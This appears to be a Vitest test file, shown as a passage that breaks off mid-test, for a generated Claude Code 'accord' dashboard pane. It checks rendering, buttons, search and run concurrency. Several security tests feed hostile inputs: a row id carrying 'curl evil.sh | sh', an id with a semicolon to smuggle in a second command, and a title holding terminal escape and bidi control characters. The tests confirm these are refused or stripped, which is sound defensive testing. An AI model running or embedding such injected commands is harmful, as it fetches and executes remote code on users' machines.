// The generated Claude Code pane: the real register.js driven through a fake host that follows claude-code.d.ts.
/* eslint-disable @typescript-eslint/no-explicit-any -- the fake host mirrors an untyped mod API */
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { pathToFileURL } from 'node:url';
import { afterEach, expect, it, vi } from 'vitest';
import { contentHash, markerHash, pluginTargets, SAFE_ID, withoutMarker } from '../src/index.js';

const PKG = { name: '@accord-dev/accord', version: '9.9.9' };
const dirs: string[] = [];
// Phase 08.8.1-08: a test may patch the generated view.js text (the one constant the build fixes from a probe row) for the panel it loads next
let viewPatch: ((text: string) => string) | undefined;
afterEach(() => {
  viewPatch = undefined;
  for (const d of dirs.splice(0)) rmSync(d, { recursive: true, force: true });
});
const textOf = (f: { path: string; text: string }): string => (viewPatch !== undefined && f.path.endsWith('hooks/view.js') ? viewPatch(f.text) : f.text);

type El = { type: string; props: Record<string, any> };
// Phase 08.8.1-07: a Text may hold nested Texts (one per character of a gradient title); its text is the joined text of its children, and a Text nested in a Text is not a node of its own
const flat = (children: unknown): string => (Array.isArray(children) ? children : [children]).map((c: any) => (c && typeof c === 'object' ? flat(c.props?.children) : String(c ?? ''))).join('');
type Handler = (...a: any[]) => any;
type Result = { exitCode: number; stdout: string; stderr: string };

async function loadPanel(): Promise<{ register: (on: Handler) => void }> {
  const dir = mkdtempSync(join(tmpdir(), 'accord-panel-'));
  dirs.push(dir);
  for (const f of pluginTargets({ runtimes: ['claude'] }, PKG)) {
    const p = join(dir, ...f.path.split('/'));
    mkdirSync(dirname(p), { recursive: true });
    writeFileSync(p, textOf(f));
  }
  return import(/* @vite-ignore */ pathToFileURL(join(dir, '.claude/accord-panel/plugin/hooks/register.js')).href);
}

async function loadView(): Promise<{ view: (state: unknown, query: string) => any; [name: string]: any }> {
  const dir = mkdtempSync(join(tmpdir(), 'accord-panel-view-'));
  dirs.push(dir);
  for (const f of pluginTargets({ runtimes: ['claude'] }, PKG)) {
    const p = join(dir, ...f.path.split('/'));
    mkdirSync(dirname(p), { recursive: true });
    writeFileSync(p, textOf(f));
  }
  return import(/* @vite-ignore */ pathToFileURL(join(dir, '.claude/accord-panel/plugin/hooks/view.js')).href);
}

async function host(mod: { register: (on: Handler) => void }) {
  type Hook = { event: string; matcher: Record<string, unknown>; fn: Handler };
  const hooks: Hook[] = [];
  mod.register((event: string, a: any, b?: any) => hooks.push(b ? { event, matcher: a, fn: b } : { event, matcher: {}, fn: a }));
  const open = new Set<string>();
  const runs: { res: (r: Result) => void; rej: (e: unknown) => void }[] = [];
  let tree: El | undefined;
  let inputText = '';
  // Phase 08.8.1-07: the plugin's own store, a Map a test can seed with an earlier session's value; set keeps JSON data as the host does
  const stored = new Map<string, unknown>();
  const h = {
    store: stored,
    placed: true,
    // Phase 08.7: the surface a draw reports, the pane's width (undefined draws no props), the agents `$.agent.list` gives, the surfaces `$.session.surfaces` gives and the timers `$.clock` was asked for
    surface: 'terminal' as string,
    columns: undefined as number | undefined,
    // Phase 08.8.1-06: the rows the pane's room reports as `scroll.bodyRows`; undefined draws no scroll prop
    rows: undefined as number | undefined,
    placement: undefined as string | undefined,
    agents: [] as Record<string, unknown>[],
    surfaces: [] as unknown[],
    timers: [] as { ms: number; fn: () => unknown; cancelled: boolean; kind: string }[],
    tree: () => tree,
    // Phase 08.8.1-05: `last` stands for the host's own step at the end of the chain (a tool call that runs); its result is what the chain resolves with
    async fire(event: string, e: any, last?: Handler): Promise<any> {
      const chain = hooks.filter((x) => x.event === event && Object.entries(x.matcher).every(([k, v]) => e[k] === v));
      const run = (i: number): Promise<any> => (i >= chain.length ? Promise.resolve(last ? last(e) : e) : Promise.resolve(chain[i].fn($, e, () => run(i + 1))));
      return run(0);
    },
    settle: (r: Partial<Result>) => (runs.shift() as { res: (r: Result) => void }).res({ exitCode: 0, stdout: '', stderr: '', ...r }),
    fail: (err: unknown) => (runs.shift() as { rej: (e: unknown) => void }).rej(err),
    inflight: () => runs.length,
    close: (id: string) => open.delete(id),
    nodes: (type: string): El[] => {
      const out: El[] = [];
      const walk = (n: any): void => {
        if (!n || typeof n !== 'object') return;
        if (n.type === type) out.push(n);
        if (n.type === 'Text') return;
        for (const c of n.props?.children ?? []) walk(c);
      };
      walk(tree);
      return out;
    },
    // first Text whose joined children equal s: its props, its direct parent Box's props, and that box's parent's props
    cell: (s: string | RegExp): { text: Record<string, any>; box: Record<string, any>; row: Record<string, any> } => {
      let found: any;
      const walk = (n: any, parent?: any, grand?: any): void => {
        if (!n || typeof n !== 'object' || found) return;
        if (n.type === 'Text' && (typeof s === 'string' ? flat(n.props.children) === s : s.test(flat(n.props.children)))) found = { text: n.props, box: parent?.props, row: grand?.props };
        if (n.type === 'Text') return;
        for (const c of n.props?.children ?? []) walk(c, n, parent);
      };
      walk(tree);
      return found;
    },
    // props of the nearest ancestor row Box of the first Text whose joined children equal s
    row: (s: string): Record<string, any> => {
      let found: any;
      const walk = (n: any, stack: any[]): void => {
        if (!n || typeof n !== 'object' || found) return;
        if (n.type === 'Text' && flat(n.props.children) === s) {
          found = [...stack].reverse().find((a) => a.type === 'Box' && a.props.flexDirection === 'row')?.props;
          return;
        }
        for (const c of n.props?.children ?? []) walk(c, [...stack, n]);
      };
      walk(tree, []);
      return found;
    },
    buttonBox: (key: string): Record<string, any> | undefined => {
      let found: any;
      const walk = (n: any, parent?: any): void => {
        if (!n || typeof n !== 'object' || found) return;
        if (n.type === 'Button' && n.props.key === key) found = parent?.props;
        for (const c of n.props?.children ?? []) walk(c, n);
      };
      walk(tree);
      return found && { ...found, children: undefined };
    },
    texts: () => h.nodes('Text').map((n) => flat(n.props.children)),
    buttons: () => h.nodes('Button').map((n) => n.props),
    input: () => h.nodes('Input')[0]?.props,
    field: () => inputText,
    type: (text: string) => ((inputText = text), h.input()?.onInput(text, {})),
  };
  const draw = async (): Promise<void> => {
    const props = { ...(h.columns === undefined ? {} : { bodyColumns: h.columns, placement: h.placement ?? 'dock' }), ...(h.rows === undefined ? {} : { scroll: { bodyRows: h.rows } }) };
    const r = await h.fire('ui.render', { component: 'Pane', requestId: 'accord-panel', surface: h.surface, props });
    if (r && r.type) tree = r;
    inputText = h.input()?.value ?? '';
  };
  const timer = (kind: string) => (ms: number, fn: () => unknown): { cancel: () => void } => {
    const t = { ms, fn, cancelled: false, kind };
    h.timers.push(t);
    return { cancel: () => void (t.cancelled = true) };
  };
  const $: any = {
    agent: { list: vi.fn(async () => h.agents) },
    clock: { after: vi.fn(timer('after')), every: vi.fn(timer('every')) },
    session: { surfaces: vi.fn(async () => h.surfaces) },
    store: {
      get: vi.fn(async (k: string) => (stored.has(k) ? JSON.parse(JSON.stringify(stored.get(k))) : undefined)),
      set: vi.fn(async (k: string, v: unknown) => void stored.set(k, JSON.parse(JSON.stringify(v)))),
    },
    process: { run: vi.fn(() => new Promise<Result>((res, rej) => runs.push({ res, rej }))) },
    command: { register: vi.fn(async () => ({})), run: vi.fn(async () => ({})) },
    ui: {
      open: vi.fn(async ({ id }: { id: string }) => {
        open.add(id);
        await draw();
      }),
      panes: vi.fn(async () => [...open].map((id) => ({ id, title: id, isShown: h.placed, isFocused: false, isPlaced: h.placed }))),
      toast: vi.fn(() => undefined),
      invalidate: vi.fn(async (event: string) => {
        if (event === 'ui.render') await draw();
      }),
      resolve: () => ({
        Box: (p: any) => ({ type: 'Box', props: p }),
        Text: (p: any) => ({ type: 'Text', props: p }),
        Button: (p: any) => ({ type: 'Button', props: p }),
        Input: (p: any) => ({ type: 'Input', props: { ...p, value: p.value ?? '' } }),
        Progress: (p: any) => ({ type: 'Progress', props: p }),
      }),
    },
  };
  return Object.assign(h, { $ });
}

const board = (over: Record<string, unknown> = {}): Record<string, unknown> => ({
  yours: { rows: [], more: 0 },
  team: { rows: [], more: 0 },
  ready: { rows: [], more: 0 },
  epics: { rows: [], more: 0 },
  summary: { inProgress: 0, ready: 0, blocked: 0, backlog: 0, done: 0, withoutLane: 0, withSchemaErrors: 0 },
  ...over,
});
const start = { cwd: '.', surface: 'terminal', isInteractive: true };

it('ac-1 the pane shows the dashboard json on open and after each turn', async () => {
  const h = await host(await loadPanel());
  await h.fire('session.start', start);
  expect(h.$.command.register).toHaveBeenCalledWith(expect.objectContaining({ name: 'accord-panel' }));
  expect(h.$.ui.open).toHaveBeenCalledWith(expect.objectContaining({ id: 'accord-panel' }));
  expect(h.$.process.run).toHaveBeenCalledTimes(1);
  expect(h.$.process.run).toHaveBeenCalledWith(['npx', '--yes', '@accord-dev/accord@9.9.9', 'dashboard', '--json'], { timeoutMs: 120000 });
  expect(h.texts()).toEqual(['Loading…']);
  h.settle({
    stdout: JSON.stringify(
      board({
        yours: { rows: [{ id: 'ST-1', title: 'Login form' }], more: 0 },
        ready: { rows: [{ id: 'ST-2', title: 'Export' }], more: 3 },
        summary: { inProgress: 7, ready: 4, blocked: 2, backlog: 5, done: 1, withoutLane: 0, withSchemaErrors: 0 },
      }),
    ),
  });
  await vi.waitFor(() => {
    const t = h.texts();
    const at = (s: string): number => t.findIndex((x) => x.includes(s));
    const order = [at('YOURS'), at('ST-1'), at('READY'), at('ST-2'), at('+3 more')];
    expect(order.every((i) => i >= 0)).toBe(true);
    expect(order).toEqual([...order].sort((a, b) => a - b));
    expect(t).toContain('7 in progress, 4 ready, 2 blocked, 5 backlog, 1 done');
  });
  await h.fire('turn.complete', { reason: 'answer' });
  expect(h.$.process.run).toHaveBeenCalledTimes(2);
  h.settle({ stdout: JSON.stringify(board({ yours: { rows: [{ id: 'ST-9', title: 'Audit' }], more: 0 } })) });
  await vi.waitFor(() => {
    expect(h.texts().some((x) => x.includes('ST-9'))).toBe(true);
    expect(h.texts().some((x) => x.includes('ST-1'))).toBe(false);
  });
});

it('risk:parsing every panel file carries one marker whose hash recomputes', () => {
  const files = pluginTargets({ runtimes: ['claude'] }, PKG);
  const base = '.claude/accord-panel/';
  expect(files.map((f) => f.path)).toEqual(
    [
      'plugin/.claude-plugin/plugin.json',
      'plugin/hooks/hooks.json',
      'plugin/hooks/register.js',
      'plugin/hooks/view.js',
      '.claude-plugin/marketplace.json',
    ]
      .map((p) => base + p)
      .sort(),
  );
  for (const f of files) {
    const hash = markerHash(f.text);
    expect(hash, f.path).toBeDefined();
    expect(markerHash(withoutMarker(f.text)), f.path).toBeUndefined();
    expect(contentHash(withoutMarker(f.text)), f.path).toBe(hash);
    if (f.path.endsWith('.json')) {
      const parsed = JSON.parse(f.text) as { description: string };
      expect(parsed.description.startsWith('generated by accord skills sync')).toBe(true);
    }
  }
  const reg = files.find((f) => f.path.endsWith('register.js'))?.text ?? '';
  expect(reg).toContain("'@accord-dev/accord@9.9.9'");
  expect(reg).not.toContain('ACCORD_PACKAGE_SPEC');
  const plugin = JSON.parse(files.find((f) => f.path.endsWith('plugin.json') && f.path.includes('plugin/.claude-plugin'))?.text ?? '{}') as { version: string };
  expect(plugin.version).toBe('9.9.9');
  expect(pluginTargets({ runtimes: ['codex'] }, PKG)).toEqual([]);
});

// Phase 08.7 D-06: the start gate keys on the render surface of a client that places panes (an interactive terminal or the Desktop Code tab); the terminal-only start test is replaced by this one.
// Every surface gets the command, a headless session registers it and nothing else, and a vscode or mobile client attaching opens nothing unasked.
it('risk:complex-branching the pane opens on an interactive terminal and a desktop client while a headless session only registers the command (D-06)', async () => {
  const headless = await host(await loadPanel());
  headless.agents = [{ id: 'a1', type: 'accord-executor', status: 'running', startTime: Date.now() }];
  await headless.fire('session.start', { ...start, isInteractive: false, surface: null });
  expect(headless.$.command.register).toHaveBeenCalledTimes(1);
  expect(headless.$.command.register).toHaveBeenCalledWith({ name: 'accord-panel', description: 'Open the accord pane' });
  expect(headless.$.ui.open).not.toHaveBeenCalled();
  expect(headless.$.process.run).not.toHaveBeenCalled();
  await headless.fire('turn.start', { turnId: 't1', text: 'x', agentId: 'a1' });
  expect(headless.$.agent.list).not.toHaveBeenCalled();
  expect(headless.$.process.run).not.toHaveBeenCalled();
  // a desktop client attaching later opens the pane once and runs the dashboard once; the command is not registered again
  await headless.fire('session.attach', { surface: 'desktop', clientId: 'desktop:default' });
  expect(headless.$.command.register).toHaveBeenCalledTimes(1);
  expect(headless.$.ui.open).toHaveBeenCalledTimes(1);
  expect(headless.$.process.run).toHaveBeenCalledTimes(1);
  expect(headless.$.process.run).toHaveBeenCalledWith(['npx', '--yes', '@accord-dev/accord@9.9.9', 'dashboard', '--json'], { timeoutMs: 120000 });
  await headless.fire('session.attach', { surface: 'desktop', clientId: 'desktop:default' });
  expect(headless.$.ui.open).toHaveBeenCalledTimes(1);
  expect(headless.$.process.run).toHaveBeenCalledTimes(1);
  // an interactive desktop session start opens the pane once, and a later attach adds nothing
  const desktop = await host(await loadPanel());
  await desktop.fire('session.start', { ...start, surface: 'desktop' });
  expect(desktop.$.command.register).toHaveBeenCalledTimes(1);
  expect(desktop.$.ui.open).toHaveBeenCalledTimes(1);
  expect(desktop.$.process.run).toHaveBeenCalledTimes(1);
  await desktop.fire('session.attach', { surface: 'desktop', clientId: 'desktop:default' });
  expect(desktop.$.command.register).toHaveBeenCalledTimes(1);
  expect(desktop.$.ui.open).toHaveBeenCalledTimes(1);
  // vscode and mobile get the command and no unasked open, at a session start and at an attach
  for (const surface of ['vscode', 'mobile']) {
    const other = await host(await loadPanel());
    await other.fire('session.start', { ...start, surface });
    await other.fire('session.attach', { surface, clientId: surface + ':1' });
    expect(other.$.command.register).toHaveBeenCalledTimes(1);
    expect(other.$.ui.open).not.toHaveBeenCalled();
    expect(other.$.process.run).not.toHaveBeenCalled();
  }
  // the terminal keeps its behaviour: an unplaced unasked open names the command once, a placed one says nothing
  const unplaced = await host(await loadPanel());
  unplaced.placed = false;
  await unplaced.fire('session.start', start);
  expect(unplaced.$.ui.toast).toHaveBeenCalledTimes(1);
  expect(unplaced.$.ui.toast).toHaveBeenCalledWith('Run /accord-panel to show the accord dashboard');
  const placed = await host(await loadPanel());
  await placed.fire('session.start', start);
  expect(placed.$.ui.toast).not.toHaveBeenCalled();
  expect(placed.$.ui.open).toHaveBeenCalledTimes(1);
});

const twoRows = JSON.stringify(
  board({
    yours: { rows: [{ id: 'ST-1', title: 'Login form' }], more: 0 },
    ready: { rows: [{ id: 'ST-2', title: 'Export' }], more: 0 },
  }),
);
const press = (h: Awaited<ReturnType<typeof host>>, key: string): void => {
  (h.buttons().find((b) => b.key === key) as { onPress: () => void }).onPress();
};

const detailOf = (over: Record<string, unknown> = {}): Record<string, unknown> => ({
  id: 'ST-1',
  title: 'Login form',
  stage: 'build',
  lane: 'M',
  tasksDone: 1,
  tasksTotal: 3,
  branch: 't/ST-1',
  holder: 'me@x',
  blockedBy: [],
  intent: ['Owners log in.'],
  criteria: [
    {
      id: 'ac-1',
      title: 'Logs in',
      steps: ['Given a user', 'When they log in', 'And they see the home page'],
      label: 'passing',
      test: 'a#b',
      testResult: 'passed',
      ticked: false,
      verification: null,
    },
  ],
  ...over,
});

it('ac-4 pressing a row id opens its detail view with its button and back', async () => {
  const h = await host(await loadPanel());
  await h.fire('session.start', start);
  h.settle({ stdout: twoRows });
  await vi.waitFor(() => expect(h.texts().some((x) => x.includes('ST-2'))).toBe(true));
  expect(h.buttons().map((b) => b.key)).toEqual(['show:ST-1', 'show:ST-2']);
  for (const b of h.buttons()) {
    const id = String(b.label);
    expect(b.plain).toBe(true);
    expect(b.children).toHaveLength(1);
    expect(b.children[0].props).toMatchObject({ underline: true, bold: true, color: 'suggestion', children: [id] });
  }
  expect(h.nodes('Text').filter((n) => n.props.underline === true)).toHaveLength(2);
  press(h, 'show:ST-1');
  expect(h.$.process.run).toHaveBeenLastCalledWith(['npx', '--yes', '@accord-dev/accord@9.9.9', 'show', 'ST-1', '--json'], { timeoutMs: 120000 });
  expect(h.$.command.run).not.toHaveBeenCalled();
  h.settle({ stdout: JSON.stringify(detailOf()) });
  await vi.waitFor(() => {
    const t = h.texts();
    for (const x of ['Login form', 'Stage: build', 'Lane: M', 'Tasks: 1/3', 'Branch: t/ST-1', 'Holder: me@x', 'Blocked by: none', 'Intent', 'Owners log in.', 'ac-1 Logs in', 'Given a user', 'And they see the home page', 'State: passing', 'Test: a#b', 'Test result: passed', 'Ticked: no', 'Verification: none']) {
      expect(t, x).toContain(x);
    }
  });
  expect(h.buttons().map((b) => b.key)).toEqual(['back', 'continue:ST-1']);
  expect(h.buttons().map((b) => b.label)).toEqual(['Back', 'Continue']);
  expect(h.input()).toBeUndefined();
  press(h, 'continue:ST-1');
  expect(h.$.command.run).toHaveBeenCalledTimes(1);
  expect(h.$.command.run).toHaveBeenLastCalledWith({ command: 'accord', args: 'continue ST-1' });
  const calls = h.$.process.run.mock.calls.length;
  press(h, 'back');
  await vi.waitFor(() => {
    expect(h.texts()).toContain('YOURS');
    expect(h.texts()).toContain('ST-2');
    expect(h.input()).toBeDefined();
  });
  expect(h.$.process.run.mock.calls.length).toBe(calls);
});

// Phase 08.8 plan 08 (D-14 IN-04): search text that starts with a command word must never run that typed form from the New request button.
it('risk:security the New request button sends the text behind a lead-in no typed form matches (D-14)', async () => {
  const { view } = await loadView();
  const state = { dashboard: board({ yours: { rows: [{ id: 'T-1', title: 'One' }], more: 0 } }) };
  for (const text of ['queue fix login', 'continue ST-1', 'pick-up ST-1', 'upgrade', 'add dark mode']) {
    const v = view(state, text);
    expect(v.newRequest, text).toMatchObject({ key: 'new-request', label: 'New request', command: 'accord', args: 'new request: ' + text });
    expect(v.newRequest.args.startsWith(text), text).toBe(false);
  }
  expect(view(state, 'zzz').noMatch).toContain('Press New request');
});

it('risk:security the panel buttons run /accord with the action and a safe id (D-03)', async () => {
  const { view } = await loadView();
  const state = {
    dashboard: board({
      yours: { rows: [{ id: 'T-1', title: 'One' }], more: 0 },
      ready: { rows: [{ id: 'T-2', title: 'Two' }, { id: 'T 5', title: 'Spaced' }, { id: 'T-6;x', title: 'Shell' }], more: 0 },
      upNext: { rows: [{ id: 'T-3', title: 'Three' }], more: 0 },
    }),
  };
  const v = view(state, '');
  const rowOf = (heading: string, id: string) => v.sections.find((s: any) => s.heading === heading).rows.find((r: any) => r.id === id);
  expect(rowOf('YOURS', 'T-1').open.action).toMatchObject({ key: 'continue:T-1', label: 'Continue', command: 'accord', args: 'continue T-1' });
  expect(rowOf('READY', 'T-2').open.action).toMatchObject({ key: 'pick-up:T-2', label: 'Pick up', command: 'accord', args: 'pick-up T-2' });
  expect(rowOf('UP NEXT', 'T-3').open.action).toMatchObject({ command: 'accord', args: 'pick-up T-3' });
  expect(rowOf('READY', 'T 5').open).toBeUndefined();
  expect(rowOf('READY', 'T-6;x').open).toBeUndefined();
  expect(view(state, 'zzz').noMatch).toContain('/accord.');
  expect(view(state, 'zzz').newRequest).toMatchObject({ key: 'new-request', label: 'New request', command: 'accord', args: 'new request: zzz' });
  expect(view(state, '').newRequest).toBeUndefined();
  const h = await host(await loadPanel());
  await h.fire('session.start', start);
  h.settle({ stdout: twoRows });
  await vi.waitFor(() => expect(h.texts().some((x) => x.includes('ST-2'))).toBe(true));
  press(h, 'show:ST-2');
  h.settle({ stdout: JSON.stringify(detailOf({ id: 'ST-2' })) });
  await vi.waitFor(() => expect(h.buttons().some((b) => b.key === 'pick-up:ST-2')).toBe(true));
  press(h, 'pick-up:ST-2');
  expect(h.$.command.run).toHaveBeenLastCalledWith({ command: 'accord', args: 'pick-up ST-2' });
});

it('ac-2 search narrows the rows and each button runs its accord command', async () => {
  const h = await host(await loadPanel());
  await h.fire('session.start', start);
  h.settle({ stdout: twoRows });
  await vi.waitFor(() => expect(h.texts().some((x) => x.includes('ST-2'))).toBe(true));
  expect(h.buttons().some((b) => b.label === 'New request')).toBe(false);
  for (const [id, key, command, args] of [['ST-1', 'continue:ST-1', 'accord', 'continue ST-1'], ['ST-2', 'pick-up:ST-2', 'accord', 'pick-up ST-2']]) {
    press(h, `show:${id}`);
    h.settle({ stdout: JSON.stringify(detailOf({ id })) });
    await vi.waitFor(() => expect(h.buttons().some((b) => b.key === key)).toBe(true));
    press(h, key);
    expect(h.$.command.run).toHaveBeenLastCalledWith({ command, args });
    press(h, 'back');
    await vi.waitFor(() => expect(h.input()).toBeDefined());
  }
  h.$.command.run.mockClear();
  h.type('login');
  await vi.waitFor(() => {
    expect(h.texts().some((x) => x.includes('ST-1'))).toBe(true);
    expect(h.texts().some((x) => x.includes('ST-2'))).toBe(false);
  });
  press(h, 'new-request');
  expect(h.$.command.run).toHaveBeenCalledTimes(1);
  expect(h.$.command.run).toHaveBeenLastCalledWith({ command: 'accord', args: 'new request: login' }); // Phase 08.8 D-14 IN-04: behind the lead-in
  h.input()?.onSubmit('login', {});
  expect(h.$.command.run).toHaveBeenCalledTimes(1);
  h.type('st-2');
  await vi.waitFor(() => {
    expect(h.texts().some((x) => x.includes('ST-2'))).toBe(true);
    expect(h.texts().some((x) => x.includes('ST-1'))).toBe(false);
  });
});

it('risk:concurrency a redraw from a finished run keeps what the owner typed', async () => {
  const h = await host(await loadPanel());
  await h.fire('session.start', start);
  h.settle({ stdout: twoRows });
  await vi.waitFor(() => expect(h.texts().some((x) => x.includes('ST-2'))).toBe(true));
  h.type('log');
  await vi.waitFor(() => expect(h.texts().some((x) => x.includes('ST-2'))).toBe(false));
  expect(h.field()).toBe('log');
  await h.fire('turn.complete', { reason: 'answer' });
  h.settle({ stdout: twoRows });
  await vi.waitFor(() => expect(h.$.ui.invalidate.mock.calls.length).toBeGreaterThanOrEqual(3));
  expect(h.field()).toBe('log');
  expect(h.input()?.value).toBe('log');
  expect(h.texts().some((x) => x.includes('ST-1'))).toBe(true);
  expect(h.texts().some((x) => x.includes('ST-2'))).toBe(false);
});

it('ac-3 a failing cli shows its message instead of a dashboard', async () => {
  const h = await host(await loadPanel());
  await h.fire('session.start', start);
  h.settle({ exitCode: 2, stderr: 'npm warn exec The following package was not found and will be installed\nset git config user.email\n' });
  await vi.waitFor(() => expect(h.texts()).toEqual(['set git config user.email']));
  expect(h.buttons()).toEqual([]);
  expect(h.input()).toBeUndefined();
});

it('ac-1 the empty search field keeps its Search label and shows the dim hint', async () => {
  const h = await host(await loadPanel());
  await h.fire('session.start', start);
  h.settle({ stdout: JSON.stringify(board({ yours: { rows: [{ id: 'ST-1', title: 'Login form' }], more: 0 } })) });
  await vi.waitFor(() => expect(h.texts().some((x) => x.includes('ST-1'))).toBe(true));
  expect(h.input()?.label).toBe('Search');
  expect(h.input()?.value).toBe('');
  expect(h.input()?.['place' + 'holder']).toBe('ticket id or title, or a new request');
});

it('ac-3 the search field is the one control marked to take focus on every draw and while loading', async () => {
  const h = await host(await loadPanel());
  const marked = () => ['Box', 'Text', 'Button', 'Input'].flatMap((t) => h.nodes(t)).filter((n) => n.props.autoFocus === true);
  const onlySearch = (): void => {
    expect(marked().map((n) => [n.type, n.props.key])).toEqual([['Input', 'search']]);
  };
  await h.fire('session.start', start);
  expect(h.texts()).toEqual(['Loading…']);
  onlySearch();
  expect(h.$.ui.open.mock.calls[0][0]).not.toHaveProperty('focus');
  h.settle({ stdout: twoRows });
  await vi.waitFor(() => expect(h.texts().some((x) => x.includes('ST-2'))).toBe(true));
  onlySearch();
  expect(h.buttons().filter((b) => b.key === 'show:ST-1' || b.key === 'show:ST-2').every((b) => b.autoFocus === undefined)).toBe(true);
  const opens = h.$.ui.open.mock.calls.length;
  h.type('log');
  await h.fire('turn.complete', { reason: 'answer' });
  await vi.waitFor(() => expect(h.inflight()).toBe(1));
  h.settle({
    stdout: JSON.stringify(
      board({
        yours: { rows: [{ id: 'ST-1', title: 'Login form' }], more: 0 },
        team: { rows: [{ id: 'ST-3', title: 'Logout' }], more: 0 },
        ready: { rows: [{ id: 'ST-2', title: 'Export' }], more: 0 },
      }),
    ),
  });
  await vi.waitFor(() => expect(h.texts().some((x) => x.includes('ST-3'))).toBe(true));
  onlySearch();
  expect(h.$.ui.open.mock.calls.length).toBe(opens);
  await h.fire('command.run', { command: 'accord-panel' });
  expect(h.$.ui.open.mock.calls.at(-1)?.[0]).toMatchObject({ focus: true });
  await vi.waitFor(() => expect(h.inflight()).toBe(1));
  h.settle({ stdout: JSON.stringify(board({ yours: { rows: [{ id: 'ST-4', title: 'Logbook' }], more: 0 } })) });
  await vi.waitFor(() => expect(h.texts().some((x) => x.includes('ST-4'))).toBe(true));
  onlySearch();
});

it('ac-2 text that matches no ticket shows the no-match line and New request', async () => {
  const LINE = 'No ticket shown here matches. Press New request to send this text to /accord.';
  const HEADINGS = ['YOURS', 'TEAM', 'READY', 'UP NEXT', 'EPICS'];
  const h = await host(await loadPanel());
  await h.fire('session.start', start);
  h.settle({ stdout: twoRows });
  await vi.waitFor(() => expect(h.texts().some((x) => x.includes('ST-2'))).toBe(true));
  h.type('zzz');
  await vi.waitFor(() => {
    expect(h.texts().filter((x) => HEADINGS.includes(x))).toEqual([]);
    expect(h.texts().some((x) => x.includes('ST-1') || x.includes('ST-2'))).toBe(false);
    expect(h.buttons().some((b) => b.key.startsWith('show:'))).toBe(false);
    expect(h.texts()).toContain(LINE);
    expect(h.buttons().some((b) => b.key === 'new-request' && b.label === 'New request')).toBe(true);
  });
  h.type('login');
  await vi.waitFor(() => {
    expect(h.texts().filter((x) => HEADINGS.includes(x))).toEqual(['YOURS']);
    expect(h.texts().some((x) => x.includes('ST-1'))).toBe(true);
    expect(h.texts().some((x) => x.includes('ST-2'))).toBe(false);
    expect(h.buttons().filter((b) => b.key.startsWith('show:')).map((b) => b.key)).toEqual(['show:ST-1']);
    expect(h.buttons().some((b) => b.key === 'new-request')).toBe(true);
    expect(h.texts()).not.toContain(LINE);
  });
});

it('risk:complex-branching a rejected run an unparsable stdout and an empty stderr each show a message', async () => {
  const cases: [(h: Awaited<ReturnType<typeof host>>) => void, string][] = [
    [(h) => h.fail(new Error('timed out')), 'accord did not finish: timed out'],
    [(h) => h.settle({ stdout: 'not json' }), 'accord dashboard --json printed no dashboard'],
    [(h) => h.settle({ stdout: '{}' }), 'accord dashboard --json printed no dashboard'],
    [(h) => h.settle({ exitCode: 3, stderr: 'npm notice x\n' }), 'accord exited 3'],
    [(h) => h.settle({ stdout: JSON.stringify(board({ yours: { rows: ['ST-1'], more: 0 } })) }), 'accord dashboard --json printed no dashboard'],
    [(h) => h.settle({ stdout: JSON.stringify(board({ upNext: { more: 0 } })) }), 'accord dashboard --json printed no dashboard'],
  ];
  for (const [run, text] of cases) {
    const h = await host(await loadPanel());
    await h.fire('session.start', start);
    run(h);
    await vi.waitFor(() => expect(h.texts()).toEqual([text]));
  }
});

it('risk:concurrency one accord run at a time and none for a subagent turn or a closed pane', async () => {
  const h = await host(await loadPanel());
  const calls = (): number => h.$.process.run.mock.calls.length;
  const drain = async (): Promise<void> => {
    while (h.inflight() > 0) {
      h.settle({});
      await new Promise((r) => setTimeout(r, 0));
    }
  };
  await h.fire('session.start', start);
  expect(calls()).toBe(1);
  await h.fire('turn.complete', { reason: 'answer' });
  await h.fire('turn.complete', { reason: 'answer' });
  expect(calls()).toBe(1);
  h.settle({});
  await vi.waitFor(() => expect(calls()).toBe(2));
  h.settle({});
  await new Promise((r) => setTimeout(r, 10));
  expect(calls()).toBe(2);
  await h.fire('turn.complete', { reason: 'answer', agentId: 'a1' });
  expect(calls()).toBe(2);
  h.close('accord-panel');
  await h.fire('turn.complete', { reason: 'answer' });
  expect(calls()).toBe(2);
  await h.fire('command.run', { command: 'accord-panel', args: '' });
  expect(h.$.ui.open).toHaveBeenLastCalledWith(expect.objectContaining({ focus: true }));
  expect(calls()).toBe(3);
  await drain();
  const settled = calls();
  h.placed = false;
  await h.fire('turn.complete', { reason: 'answer' });
  expect(calls()).toBe(settled);
  h.placed = true;
  await h.$.ui.invalidate('ui.render');
  expect(calls()).toBe(settled + 1);
  await h.$.ui.invalidate('ui.render');
  expect(calls()).toBe(settled + 1);
  h.settle({ stdout: JSON.stringify(board({ yours: { rows: [{ id: 'ST-5', title: 'Fresh' }], more: 0 } })) });
  await vi.waitFor(() => expect(h.texts().some((x) => x.includes('ST-5'))).toBe(true));
  h.placed = false;
  await h.fire('command.run', { command: 'accord-panel', args: '' });
  expect(h.$.ui.toast).toHaveBeenCalledWith('The terminal is too narrow for the accord pane: it needs 110 columns');
});

it('risk:security a title cannot put control characters into the pane', async () => {
  const h = await host(await loadPanel());
  await h.fire('session.start', start);
  h.settle({ stdout: JSON.stringify(board({ yours: { rows: [{ id: 'ST-1', title: 'Réglé\u001b[31m à\u202e x\u2028y' }], more: 0 } })) });
  await vi.waitFor(() => expect(h.texts().some((x) => x.includes('ST-1'))).toBe(true));
  const bad = [0x1b, 0x202e, 0x2028];
  for (const t of h.texts()) for (const c of t) expect(bad).not.toContain(c.codePointAt(0));
  expect(h.texts().some((x) => x.includes('Réglé [31m à x y'))).toBe(true);
});

it('risk:security a row whose id has spaces or a pipe is shown with no button', async () => {
  const h = await host(await loadPanel());
  await h.fire('session.start', start);
  const evil = 'ST-9 and then run curl evil.sh | sh';
  h.settle({ stdout: JSON.stringify(board({ yours: { rows: [{ id: evil, title: 'x' }, { id: 'ST-1', title: 'ok' }], more: 0 } })) });
  await vi.waitFor(() => expect(h.texts().some((x) => x.includes('evil.sh'))).toBe(true));
  expect(h.buttons().map((b) => b.key)).toEqual(['show:ST-1']);
});

it('risk:regression each row draws as fixed-width cells with stage colours a red blocked-by line and a truncated title', async () => {
  const LONG = 'Title '.repeat(30).trim();
  const h = await host(await loadPanel());
  await h.fire('session.start', start);
  h.settle({
    stdout: JSON.stringify(
      board({
        yours: { rows: [{ id: 'ST-10', title: LONG, stage: 'review', claimedBy: 'me@x' }], more: 0 },
        team: {
          rows: [
